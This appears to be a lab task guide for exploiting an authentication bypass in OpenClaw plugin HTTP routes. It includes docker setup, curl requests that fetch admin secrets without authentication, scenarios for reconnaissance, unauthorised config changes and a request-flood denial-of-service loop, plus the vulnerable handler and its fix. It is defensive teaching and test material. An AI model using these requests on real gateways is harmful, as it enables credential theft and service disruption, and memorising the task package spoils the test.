# HOWTO: OpenClaw Plugin HTTP Auth Bypass Exploitation

## Step-by-Step Manual Testing Guide

### Step 1: Start the Environment

```bash
cd ../../runtimes/openclaw-plugin-http-bypass
export TASK_ID=plugin-http-auth-bypass
docker compose up -d
```

Wait for containers to start:
- `openclaw-security-test-plugin-http-auth-bypass` (target gateway)
- `openclaw-attacker-plugin-http-auth-bypass` (attacker)

### Step 2: Verify Target Setup

```bash
cd ../../tasks/task-openclaw-plugin-http-auth-bypass
docker cp start.sh openclaw-security-test-plugin-http-auth-bypass:/workspace/
docker exec openclaw-security-test-plugin-http-auth-bypass bash /workspace/start.sh
```

This verifies:
- OpenClaw gateway is running on port 18789
- Vulnerable plugin is loaded
- Plugin HTTP routes are registered
- Gateway authentication is enabled (but will be bypassed)

### Step 3: Execute Authentication Bypass Exploit

#### Method 1: Direct curl (PoC)

```bash
# Access plugin route WITHOUT authentication
docker exec openclaw-attacker-plugin-http-auth-bypass curl -v \
  http://openclaw:18789/api/admin/secrets
```

Expected response: JSON containing sensitive credentials with proof marker.

#### Method 2: Get internal status

```bash
docker exec openclaw-attacker-plugin-http-auth-bypass curl -v \
  http://openclaw:18789/api/admin/status
```

Expected response: Internal service information, user list, version details.

#### Method 3: Run automated exploit

```bash
docker cp run_agent.sh openclaw-attacker-plugin-http-auth-bypass:/workspace/
docker exec openclaw-attacker-plugin-http-auth-bypass bash /workspace/run_agent.sh
```

### Step 4: Verify Exploitation

```bash
docker cp verify.sh openclaw-attacker-plugin-http-auth-bypass:/workspace/
docker exec openclaw-attacker-plugin-http-auth-bypass bash /workspace/verify.sh
```

### Step 5: Cleanup

```bash
cd ../../runtimes/openclaw-plugin-http-bypass
docker compose down
```

## Understanding the Vulnerability

### Attack Flow

```
1. Attacker sends HTTP GET to /api/admin/secrets
2. Gateway receives request on port 18789
3. createGatewayPluginRequestHandler() is called
4. VULNERABILITY: No authentication check performed
5. Plugin route handler executes immediately
6. Sensitive data read from /host_secrets/admin_credentials.json
7. Data returned to attacker
8. Attacker exfiltrates credentials
```

### Why This Works

**WebSocket Authentication (Working):**
```
Client connects → WebSocket upgrade → checkAuth() called →
Token validated → Connection established or rejected
```

**Plugin HTTP Route (Bypassed):**
```
Client sends HTTP → Route matched → Handler executed →
NO AUTH CHECK → Response returned
```

### Code Analysis

#### Vulnerable Function

```typescript
// src/gateway/server/plugins-http.ts:12
export function createGatewayPluginRequestHandler(params) {
  return async (req, res) => {
    const route = routes.find((entry) => entry.path === url.pathname);
    if (route) {
      // BUG: Directly executes handler without auth check!
      await route.handler(req, res);
      return true;
    }
  };
}
```

#### Should Be

```typescript
export function createGatewayPluginRequestHandler(params) {
  return async (req, res) => {
    // ADD: Authentication check
    const isAuthenticated = await checkGatewayAuth(req, resolvedAuth);
    if (!isAuthenticated) {
      res.writeHead(401);
      res.end('Unauthorized');
      return true;
    }

    const route = routes.find((entry) => entry.path === url.pathname);
    if (route) {
      await route.handler(req, res);
      return true;
    }
  };
}
```

### Attack Scenarios

#### Scenario 1: Credential Theft

**Target**: `/api/admin/secrets`

```bash
curl http://openclaw:18789/api/admin/secrets
# Returns: {"api_key":"sk-...", "admin_password":"...", ...}
```

**Impact**: Full admin credentials exposed

#### Scenario 2: Internal Reconnaissance

**Target**: `/api/admin/status`

```bash
curl http://openclaw:18789/api/admin/status
# Returns: Internal service addresses, user lists, version info
```

**Impact**: Network mapping, service discovery

#### Scenario 3: State Modification

If plugin exposes POST routes:

```bash
curl -X POST http://openclaw:18789/api/admin/config \
  -d '{"setting":"value"}'
# Could modify gateway configuration
```

**Impact**: Unauthorized configuration changes

#### Scenario 4: Denial of Service

```bash
# Repeatedly invoke expensive plugin endpoints
for i in {1..1000}; do
  curl http://openclaw:18789/api/admin/expensive-operation &
done
```

**Impact**: Resource exhaustion

## Comparison: Authenticated vs Unauthenticated Access

### WebSocket Connection (Requires Auth)

```bash
# FAILS without token
wscat -c ws://openclaw:18789
# ERROR: Unauthorized

# SUCCEEDS with token
wscat -c ws://openclaw:18789?token=super-secret-gateway-token-12345
# Connected
```

### Plugin HTTP Route (No Auth Required)

```bash
# SUCCEEDS without any authentication
curl http://openclaw:18789/api/admin/secrets
# Returns sensitive data

# No token, password, or headers needed!
```

## Testing Authentication Bypass

### Test 1: Confirm Gateway Auth is Enabled

```bash
# Try WebSocket without auth - should fail
docker exec openclaw-attacker-plugin-http-auth-bypass \
  curl -v http://openclaw:18789/
# Check for auth requirements in response
```

### Test 2: Bypass Auth via Plugin Route

```bash
# Access plugin route without auth - should succeed (vulnerability!)
docker exec openclaw-attacker-plugin-http-auth-bypass \
  curl -v http://openclaw:18789/api/admin/secrets
# Returns sensitive data despite no authentication
```

### Test 3: Verify Proof Marker

```bash
docker exec openclaw-attacker-plugin-http-auth-bypass \
  curl http://openclaw:18789/api/admin/secrets | grep OPENCLAW-PLUGIN-HTTP-BYPASS-VERIFIED
# Should find the proof marker
```

## Automated Exploitation Script

The `run_agent.sh` script automates:
1. Wait for gateway to be ready
2. Attempt to access `/api/admin/secrets` without auth
3. Verify response contains sensitive data
4. Attempt to access `/api/admin/status` without auth
5. Save results to `/workspace/bypass_result.txt`
6. Confirm proof marker is present

## Expected Results

**Success Indicators:**
- ✅ HTTP 200 response from plugin routes
- ✅ Sensitive data in response body
- ✅ Proof marker `OPENCLAW-PLUGIN-HTTP-BYPASS-VERIFIED` present
- ✅ No authentication headers required
- ✅ Data saved to `/workspace/bypass_result.txt`

**Failure Indicators:**
- ❌ HTTP 401 Unauthorized response
- ❌ Authentication required error
- ❌ Empty or error response
- ❌ Proof marker not found

## Security Notes

⚠️ **For Defensive Security Research Only**

This vulnerability demonstrates:
- Authentication bypass in plugin HTTP route handling
- Importance of enforcing authentication at all entry points
- Difference between WebSocket auth and HTTP route auth
- Need for consistent security checks across all handlers

Use this knowledge to:
- Understand authentication bypass vulnerabilities
- Test defensive security controls
- Develop detection rules
- Improve security architecture

**Do not use for malicious purposes.**
